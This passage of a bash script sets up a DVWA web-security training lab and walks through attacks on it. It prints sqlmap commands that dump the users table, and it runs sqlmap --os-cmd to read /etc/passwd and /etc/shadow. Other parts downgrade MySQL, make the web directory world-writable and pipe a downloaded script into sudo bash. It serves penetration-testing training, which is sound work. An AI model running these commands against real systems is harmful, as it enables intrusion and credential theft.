        zap-cli active-scan "${TARGET}" --context-name "dvwa-context" --user-name "admin" || print_warn "ZAP Active Scan failed or completed with errors."
        print_success "ZAP Active Scan completed."

        print_info "Generating OWASP ZAP HTML Report to ${OUTDIR}/zap_report.html.."
        zap-cli report -o "${OUTDIR}/zap_report.html" -f html || print_warn "Failed to generate ZAP report."
        print_success "OWASP ZAP report generated."

        print_info "Shutting down ZAP daemon.."
        zap-cli shutdown || print_warn "Failed to shut down ZAP daemon cleanly."
        print_success "OWASP ZAP automated scan completed."
    fi

    echo ""
    print_info "3. OpenVAS (GVM) Setup and Scan (More for Network/System Vulnerabilities):"
    print_info "   - OpenVAS (now GVM) is a powerful network vulnerability scanner but requires significant setup and can consume considerable system resources and time (hours or more for initial setup)."
    print_info "   - If GVM is not set up, run 'sudo gvm-setup' in a terminal. Follow all prompts."
    print_info "   - Access the GVM web interface (usually https://127.0.0.1:9392 from Kali) using the credentials provided during setup."
    print_info "   - Navigate to 'Configuration' -> 'Targets'. Create a new target for your DVWA VM's IP address (e.g., ${TARGET_HOST})."
    print_info "   - Navigate to 'Scans' -> 'Tasks'. Create a new task, select the DVWA target, and choose a suitable scan configuration (e.g., 'Full and fast')."
    print_info "   - Start the task and wait for it to complete."
    print_info "   - Once the scan is complete, view the report in the GVM interface. Export it (e.g., to PDF or HTML) and save it to ${OUTDIR}/openvas_report.pdf (or .html)."
    echo ""

    print_info "4. Manual Vulnerability Confirmation and Analysis:"
    print_info "   - For each 'important' finding listed in your ZAP or OpenVAS report (e.g., SQL Injection, Cross-Site Scripting (XSS), Cross-Site Request Forgery (CSRF), File Inclusion, Broken Authentication):"
    print_info "     - Manually attempt to reproduce and confirm the vulnerability using your browser or command-line tools against DVWA."
    print_info "     - Analyze the DVWA source code (e.g., in /var/www/html/dvwa/vulnerabilities/) to understand why the vulnerability exists (e.g., lack of input validation, insufficient escaping)."
    print_info "     - Document your findings, including steps to reproduce, impact, and root cause."

    print_success "Vulnerability scanning guidance provided. Manual execution, configuration, and analysis are crucial for these tasks."
}

# Function: kali_demonstrate_sqlmap_sqli
# Provides sample sqlmap commands for basic SQL injection attacks against DVWA.
kali_demonstrate_sqlmap_sqli() {
    print_title "=== SQLmap SQL Injection Demonstration ==="

    local TARGET="$DVWA_TARGET_URL"
    local SQLMAP_OUTDIR="$HOME/scans/dvwa/sqlmap_sqli"
    mkdir -p "$SQLMAP_OUTDIR"

    print_info "Targeting DVWA VM at: ${TARGET}"

    print_info "Before running sqlmap:"
    print_info "1. Log into DVWA (admin/password) from your Kali browser."
    print_info "2. Set the 'Security Level' to 'Low' under 'DVWA Security'."
    print_info "3. Navigate to 'SQL Injection (Blind)' or 'SQL Injection' vulnerabilities."
    print_info "4. Capture your PHPSESSID cookie from browser developer tools (e.g., Firefox: F12 -> Storage -> Cookies)."
    print_warn "   You MUST replace <YOUR_PHPSESSID_HERE> with your actual PHPSESSID cookie value for these commands to work."
    echo ""

    print_info "Example 1: Listing databases using sqlmap against DVWA SQLi (GET) vulnerability:"
    echo "${GREEN}sqlmap -u \"${TARGET}/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit\" \\"
    echo "    --cookie=\"PHPSESSID=<YOUR_PHPSESSID_HERE>; security=low\" \\"
    echo "    --dbs --batch --level=1 --risk=1 \\"
    echo "    --output-dir=\"${SQLMAP_OUTDIR}\" --file-log=\"${SQLMAP_OUTDIR}/sqlmap_sqli_dbs.log\"${RESET}"
    echo ""

    print_info "Example 2: Dumping tables from the 'dvwa' database:"
    echo "${GREEN}sqlmap -u \"${TARGET}/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit\" \\"
    echo "    --cookie=\"PHPSESSID=<YOUR_PHPSESSID_HERE>; security=low\" \\"
    echo "    -D dvwa --tables --batch --level=1 --risk=1 \\"
    echo "    --output-dir=\"${SQLMAP_OUTDIR}\" --file-log=\"${SQLMAP_OUTDIR}/sqlmap_sqli_tables.log\"${RESET}"
    echo ""

    print_info "Example 3: Dumping columns from the 'users' table in 'dvwa' database:"
    echo "${GREEN}sqlmap -u \"${TARGET}/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit\" \\"
    echo "    --cookie=\"PHPSESSID=<YOUR_PHPSESSID_HERE>; security=low\" \\"
    echo "    -D dvwa -T users --columns --batch --level=1 --risk=1 \\"
    echo "    --output-dir=\"${SQLMAP_OUTDIR}\" --file-log=\"${SQLMAP_OUTDIR}/sqlmap_sqli_columns.log\"${RESET}"
    echo ""

    print_info "Example 4: Dumping data (usernames/passwords) from the 'users' table in 'dvwa' database:"
    echo "${GREEN}sqlmap -u \"${TARGET}/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit\" \\"
    echo "    --cookie=\"PHPSESSID=<YOUR_PHPSESSID_HERE>; security=low\" \\"
    echo "    -D dvwa -T users --dump --batch --level=1 --risk=1 \\"
    echo "    --output-dir=\"${SQLMAP_OUTDIR}\" --file-log=\"${SQLMAP_OUTDIR}/sqlmap_sqli_dump_users.log\"${RESET}"
    echo ""

    print_success "SQLmap SQL Injection demonstration commands provided. Manual execution is required."
    print_info "Ensure you replace <YOUR_PHPSESSID_HERE> with your valid session cookie."
}

# Function: kali_exploit_sqlmap_os_shell
# Attempts to get an OS shell on DVWA VM via sqlmap and extracts sensitive files.
kali_exploit_sqlmap_os_shell() {
    print_title "=== SQLmap OS Shell Exploitation (DVWA - Vulnerable MySQL Required) ==="

    local TARGET="$DVWA_TARGET_URL"
    local OS_SHELL_OUTDIR="$HOME/scans/dvwa/os_shell_loot"
    mkdir -p "$OS_SHELL_OUTDIR"

    print_info "Targeting DVWA VM at: ${TARGET}"
    print_warn "This exploit typically requires the DVWA VM to be running a vulnerable MySQL version (e.g., 5.5 in Docker) and for the DVWA directory to be world-writable (ugo+rw)."
    print_warn "Ensure you have already run the 'mysql50' argument on the Ubuntu VM (for Dockerized MySQL) AND 'set_permissions_ubuntu' argument for DVWA directory."
    print_info "Verify MySQL Docker container is running on your Ubuntu VM: 'sudo docker ps -f name=dvwa-vulnerable-mysql' (from the Ubuntu VM)"


    print_info "Before running sqlmap --os-shell:"
    print_info "1. Log into DVWA (admin/password) from your Kali browser."
    print_info "2. Set the 'Security Level' to 'Low' under 'DVWA Security'."
    print_info "3. Navigate to 'SQL Injection (Blind)' or 'SQL Injection' vulnerabilities."
    print_info "4. Capture your PHPSESSID cookie from browser developer tools."
    print_warn "   You MUST replace <YOUR_PHPSESSID_HERE> with your actual PHPSESSID cookie value."
    echo ""

    # Using --os-cmd for each command, as interactive shells are hard to script and log
    # For sqlmap --os-cmd, it typically tries to upload a web shell and execute the command.
    # We must also provide the web server root and language.
    local SQLMAP_BASE_CMD="sqlmap -u \"${TARGET}/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit\" --cookie=\"PHPSESSID=<YOUR_PHPSESSID_HERE>; security=low\" --web-server=apache --os-shell-chroot=/ --technique=U --batch --retries=3 --tmp-dir=$OS_SHELL_OUTDIR --data-dir=$OS_SHELL_OUTDIR" # --data-dir specified for sqlmap temp files

    # Using 'eval' because the command string contains variables and needs to be parsed by the shell
    print_info "Running 'pwd' via sqlmap --os-cmd. Output saved to ${OS_SHELL_OUTDIR}/pwd.log"
    eval "${SQLMAP_BASE_CMD} --os-cmd=\"pwd\" --file-log=\"${OS_SHELL_OUTDIR}/pwd.sqlmap.log\" > \"${OS_SHELL_OUTDIR}/pwd.log\" 2>&1" || print_warn "Failed to run 'pwd' or output capture issue. Check logs."

    print_info "Running 'whoami' via sqlmap --os-cmd. Output saved to ${OS_SHELL_OUTDIR}/whoami.log"
    eval "${SQLMAP_BASE_CMD} --os-cmd=\"whoami\" --file-log=\"${OS_SHELL_OUTDIR}/whoami.sqlmap.log\" > \"${OS_SHELL_OUTDIR}/whoami.log\" 2>&1" || print_warn "Failed to run 'whoami' or output capture issue. Check logs."

    print_info "Running 'cat /etc/passwd' via sqlmap --os-cmd. Output saved to ${OS_SHELL_OUTDIR}/passwd.log"
    eval "${SQLMAP_BASE_CMD} --os-cmd=\"cat /etc/passwd\" --file-log=\"${OS_SHELL_OUTDIR}/passwd.sqlmap.log\" > \"${OS_SHELL_OUTDIR}/passwd.log\" 2>&1" || print_warn "Failed to run 'cat /etc/passwd' or output capture issue. Check logs."

    print_info "Running 'cat /etc/shadow' via sqlmap --os-cmd. Output saved to ${OS_SHELL_OUTDIR}/shadow.log"
    eval "${SQLMAP_BASE_CMD} --os-cmd=\"cat /etc/shadow\" --file-log=\"${OS_SHELL_OUTDIR}/shadow.sqlmap.log\" > \"${OS_SHELL_OUTDIR}/shadow.log\" 2>&1" || print_warn "Failed to run 'cat /etc/shadow' or output capture issue. Check logs."

    print_success "SQLmap OS shell commands attempted. Check the files in ${OS_SHELL_OUTDIR} for output."
    print_info "If '--os-cmd' commands fail, try the interactive '--os-shell' mode manually:"
    echo "${GREEN}sqlmap -u \"${TARGET}/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit\" \\"
    echo "    --cookie=\"PHPSESSID=<YOUR_PHPSESSID_HERE>; security=low\" \\"
    echo "    --os-shell --web-server=apache --os-shell-chroot=/ \\"
    echo "    --output-dir=\"$OS_SHELL_OUTDIR\"${RESET}"
    print_warn "   Remember to replace <YOUR_PHPSESSID_HERE>."
    print_info "   When in the sql-shell, you might be asked to provide web server language (choose 'php'), and web server document root (specify '/var/www/html/dvwa')."
}

# Function to display the final signature
print_signature() {
    echo -e "\n\033[92mCreated with ♡, Harsha\033[0m\n"
}

### === MAIN LOGIC === ###
case "${1:-}" in
    # Ubuntu DVWA VM Arguments
    "dvwa")
        print_info "Detected 'dvwa' argument. Proceeding with DVWA Ubuntu VM installation (SSH + DVWA with Apache2, and Modern MySQL)."
        ubuntu_install_ssh
        ubuntu_install_dvwa_apache_mysql
        print_info "[✔] Full SSH + DVWA (Apache2, Modern MySQL) installation complete on Ubuntu VM."
        print_signature
        ;;
    "mysql50")
        print_info "Detected 'mysql50' argument. Proceeding with Dockerized MySQL 5.5 installation on DVWA Ubuntu VM."
        ubuntu_install_mysql_docker_vulnerable # Call the new Docker function
        print_info "[✔] Dockerized MySQL 5.5 installation complete on Ubuntu VM."
        print_signature
        ;;
    "set_permissions_ubuntu")
        print_info "Detected 'set_permissions_ubuntu' argument. Proceeding to set DVWA directory permissions on Ubuntu VM."
        ubuntu_set_dvwa_permissions
        print_info "[✔] DVWA directory permissions set on Ubuntu VM."
        print_signature
        ;;

    # Kali VM Arguments
    "kali_prereqs")
        print_info "Detected 'kali_prereqs' argument. Proceeding with Kali attack tools prerequisite installation."
        kali_install_tools_prerequisites
        print_info "[✔] Kali attack tools prerequisites installation complete."
        print_signature
        ;;
    "kali_web_scan")
        print_info "Detected 'kali_web_scan' argument. Proceeding to run web content scanners on Kali VM."
        kali_run_web_content_scanners
        print_info "[✔] Web content scanning demonstration complete."
        print_signature
        ;;
    "kali_brute_force")
        print_info "Detected 'kali_brute_force' argument. Providing brute-force attack instructions for Kali VM."
        kali_demonstrate_brute_force
        print_info "[✔] Brute-force attack instructions provided."
        print_signature
        ;;
    "kali_vuln_scan")
        print_info "Detected 'kali_vuln_scan' argument. Providing vulnerability scanner instructions for Kali VM."
        kali_demonstrate_vuln_scanners
        print_info "[✔] Vulnerability scanner instructions provided."
        print_signature
        ;;
    "kali_sqlmap_sqli")
        print_info "Detected 'kali_sqlmap_sqli' argument. Providing sqlmap SQLi demonstration for Kali VM."
        kali_demonstrate_sqlmap_sqli
        print_info "[✔] SQLmap SQLi demonstration provided."
        print_signature
        ;;
    "kali_os_shell")
        print_info "Detected 'kali_os_shell' argument. Proceeding with sqlmap OS shell exploitation on Kali VM."
        kali_exploit_sqlmap_os_shell
        print_info "[✔] SQLmap OS shell exploitation guidance provided."
        print_signature
        ;;
    *)
        print_error "Invalid argument: $1"
        echo "Usage: wget -qO- <script_url> | sudo bash [-s <argument>]"
        echo ""
        echo "Arguments for Ubuntu DVWA VM:"
        echo "  dvwa                  : Install SSH, DVWA (Apache2+Modern MySQL)"
        echo "  mysql50               : Downgrade DVWA's database to MySQL 5.5 via Docker"
        echo "  set_permissions_ubuntu: Set DVWA directory to be world-writable (for os-shell exploit)"
        echo ""
        echo "Arguments for Kali VM (ensure DVWA Ubuntu VM is accessible):"
        echo "  kali_prereqs          : Install common attack tools"
        echo "  kali_web_scan         : Run dirb and gobuster web content scanners"
        echo "  kali_brute_force      : Demonstrate brute-force with Burp/Hydra"
        echo "  kali_vuln_scan        : Demonstrate vulnerability scanning with ZAP/OpenVAS"
        echo "  kali_sqlmap_sqli      : Demonstrate basic SQL injection with sqlmap"
        echo "  kali_os_shell         : Attempt OS shell with sqlmap and extract files"
        exit 1
        ;;
esac